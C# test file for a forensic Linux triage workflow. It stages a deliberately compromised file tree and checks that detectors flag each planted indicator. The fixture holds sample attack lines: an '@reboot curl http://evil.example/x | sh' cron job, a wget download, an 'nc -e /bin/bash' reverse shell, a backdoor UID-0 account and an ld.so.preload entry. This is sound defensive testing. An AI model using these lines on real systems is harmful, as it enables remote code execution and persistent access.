using System;
using System.Linq;
using System.Text;

using Camel.Environments;
using Camel.Workflows;
using Camel.DFIR.Workflows;

namespace Camel.Tests.Workflows;

/// <summary>
/// Exercises <see cref="LinuxAnalysisWorkflow"/> against a small, deliberately "compromised" rooted artifact tree
/// staged on the SIFT workstation (a stand-in for a mounted Linux image): a backdoor UID-0 account, an
/// empty-password account, passwordless sudo, an @reboot curl|sh cron job, an ld.so.preload entry, a planted SUID
/// binary, a temp-dir dropper, attacker-pattern shell history, and an nmap install in the dpkg log. Each workflow
/// must surface its corresponding indicator. Login/journal tests run against the live host (real wtmp/journal).
/// </summary>
public class LinuxAnalysisWorkflowTests : TestsRuntime, IDisposable
{
    public LinuxAnalysisWorkflowTests()
    {
        var sshconfig = EnsureSIFT(LoadConfigFile("sshtestappsettings.json"));
        sshenv = AuditEnvironment.CreateFromConfig(sshconfig);
        api = new CamelToolkitsApi(sshenv, sshconfig);
        workflow = new LinuxAnalysisWorkflow(api);
        StageFakeRoot();
    }

    const string R = "/tmp/camel_lin_root";

    // Builds the compromised rooted artifact tree via a single base64'd script (dodges all shell quoting).
    private void StageFakeRoot()
    {
        const string script = """
            set -e
            R=/tmp/camel_lin_root
            rm -rf "$R"
            mkdir -p "$R/etc/sudoers.d" "$R/etc/cron.d" "$R/root" "$R/usr/local/bin" "$R/tmp" "$R/var/lib/dpkg" "$R/var/log/apt"
            cat > "$R/etc/os-release" <<'EOF'
            NAME="Ubuntu"
            ID=ubuntu
            VERSION_ID="22.04"
            PRETTY_NAME="Ubuntu 22.04.3 LTS"
            EOF
            cat > "$R/etc/passwd" <<'EOF'
            root:x:0:0:root:/root:/bin/bash
            daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
            hacker:x:0:0::/root:/bin/bash
            bad::1001:1001::/home/bad:/bin/bash
            normal:x:1002:1002::/home/normal:/bin/bash
            EOF
            cat > "$R/etc/shadow" <<'EOF'
            root:!:19000:0:99999:7:::
            hacker:$6$abc$defhash:19500:0:99999:7:::
            bad::19500:0:99999:7:::
            normal:$6$xyz$hash:19500:0:99999:7:::
            EOF
            printf '%s\n' 'eviluser ALL=(ALL) NOPASSWD: ALL' > "$R/etc/sudoers.d/90-evil"
            cat > "$R/etc/crontab" <<'EOF'
            17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
            @reboot	root	curl http://evil.example/x | sh
            EOF
            printf '%s\n' '/tmp/evil.so' > "$R/etc/ld.so.preload"
            cat > "$R/root/.bash_history" <<'EOF'
            ls -la
            wget http://evil.example/m -O /tmp/m
            nc -e /bin/bash 1.2.3.4 4444
            history -c
            EOF
            printf '#!/bin/sh\necho pwned\n' > "$R/usr/local/bin/backdoor"; chmod 4755 "$R/usr/local/bin/backdoor"
            printf '#!/bin/sh\necho dropper\n' > "$R/tmp/evil.sh"; chmod 755 "$R/tmp/evil.sh"
            cat > "$R/var/lib/dpkg/status" <<'EOF'
            Package: bash
            Status: install ok installed
            Version: 5.1-6ubuntu1
            Architecture: amd64

            Package: nmap
            Status: install ok installed
            Version: 7.80+dfsg1-2build1
            Architecture: amd64
            EOF
            printf '2026-06-10 12:00:00 install nmap:amd64 <none> 7.80+dfsg1-2build1\n2026-06-10 12:00:01 status installed nmap:amd64 7.80+dfsg1-2build1\n' > "$R/var/log/dpkg.log"
            """;
        var b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(script.Replace("\r\n", "\n")));
        sshenv.ExecuteCommand("bash", $"-c \"echo {b64} | base64 -d | bash\"", out _, false);
    }

    [Fact]
    public async Task FlagsAnomalousAccounts()
    {
        var r = await workflow.AnalyzeUserAccountsAsync(R);
        Assert.True(r.IsSuccess, r.Message);
        var issues = r.Result!.Findings.Select(f => (f.Username, f.Issue)).ToArray();
        Assert.Contains(issues, i => i.Username == "hacker" && i.Issue == "uid0-extra");
        Assert.Contains(issues, i => i.Username == "bad" && i.Issue == "empty-password");
        Assert.Contains(r.Result.Findings, f => f.Issue == "sudo-nopasswd");
    }

    [Fact]
    public async Task FlagsPersistence()
    {
        var r = await workflow.HuntPersistenceAsync(R);
        Assert.True(r.IsSuccess, r.Message);
        // The @reboot curl|sh cron and the ld.so.preload entry must both score suspicious.
        Assert.Contains(r.Result!.Suspicious, p => p.Mechanism == "cron-reboot" && p.Detail!.Contains("curl"));
        Assert.Contains(r.Result.Suspicious, p => p.Mechanism == "ld-preload");
    }

    [Fact]
    public async Task FlagsShellHistory()
    {
        var r = await workflow.AnalyzeShellHistoryAsync(R);
        Assert.True(r.IsSuccess, r.Message);
        var cmds = r.Result!.Suspicious;
        Assert.Contains(cmds, c => c.Command.Contains("wget") && c.Categories.Contains("download"));
        Assert.Contains(cmds, c => c.Command.Contains("nc -e") && c.Categories.Contains("lateral-c2"));
        Assert.Contains(cmds, c => c.Command.Contains("history -c") && c.Categories.Contains("cleanup"));
    }

    [Fact]
    public async Task FlagsAnomalousFiles()
    {
        var r = await workflow.HuntAnomalousFilesAsync(R);
        Assert.True(r.IsSuccess, r.Message);
        Assert.Contains(r.Result!.SuspiciousSetuid, f => f.Path.EndsWith("/usr/local/bin/backdoor") && f.IsSetuid);
        Assert.Contains(r.Result.ExecutablesInTempDirs, f => f.Path.EndsWith("/tmp/evil.sh"));
    }

    [Fact]
    public async Task FlagsHackToolPackageInstall()
    {
        var r = await workflow.AnalyzeInstalledPackagesAsync(R);
        Assert.True(r.IsSuccess, r.Message);
        Assert.True(r.Result!.InstalledCount >= 2);
        Assert.Contains(r.Result.Findings, e => e.Package == "nmap" && e.Action == "install");
    }

    [Fact]
    public async Task TriageHostRollsUpFindings()
    {
        var r = await workflow.TriageHostAsync(R);
        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result!.System);
        Assert.Equal("ubuntu", r.Result.System!.DistroId, ignoreCase: true);
        // The roll-up must include indicators from several sub-reports.
        var top = r.Result.TopFindings;
        Assert.Contains(top, t => t.Contains("[account]"));
        Assert.Contains(top, t => t.Contains("[persistence/"));
        Assert.Contains(top, t => t.Contains("[history]"));
    }

    [Fact]
    public async Task AnalyzesLiveLoginActivity()
    {
        // Real wtmp/btmp on the SIFT host (the staged tree has none).
        var r = await workflow.AnalyzeLoginActivityAsync("/");
        Assert.True(r.IsSuccess, r.Message);
        Assert.True(r.Result!.SuccessfulCount > 0);
    }

    [Fact]
    public async Task AnalyzesLiveJournal()
    {
        var r = await workflow.AnalyzeJournalAsync("/", maxEntries: 500);
        Assert.True(r.IsSuccess, r.Message);
        Assert.True(r.Result!.TotalEntries > 0);
    }

    public void Dispose() => sshenv.ExecuteCommand("rm", $"-rf {R}", out _, false);

    AuditEnvironment sshenv;
    CamelToolkitsApi api;
    LinuxAnalysisWorkflow workflow;
}
